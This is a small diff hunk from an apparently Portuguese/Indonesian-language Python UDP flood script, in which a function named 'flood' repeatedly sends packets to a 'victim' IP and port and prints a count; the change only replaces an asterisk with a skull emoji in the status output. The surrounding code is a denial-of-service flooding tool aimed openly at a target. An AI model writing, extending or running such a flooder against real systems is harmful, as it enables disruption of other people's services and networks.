@@ -51,7 +51,7 @@ def flood(korbanmu, vport, durasi):
             pass
         client.sendto(bytes, (korbanmu, vport))
         sent = sent + 1
-        print (bcolors.CABECALHO + "[\033[94m*\033[95m] BYTES POR SEG. [\033[92m%s\033[95m] PARA O IP[\033[91m%s\033[95m] PORTA [\033[94m%s\033[95m] " %(sent, korbanmu, vport))
+        print (bcolors.CABECALHO + "[\033[94m☠️\033[95m] BYTES POR SEG. [\033[92m%s\033[95m] PARA O IP[\033[91m%s\033[95m] PORTA [\033[94m%s\033[95m] " %(sent, korbanmu, vport))
 
 
 #INICIA O SCRIPT :)
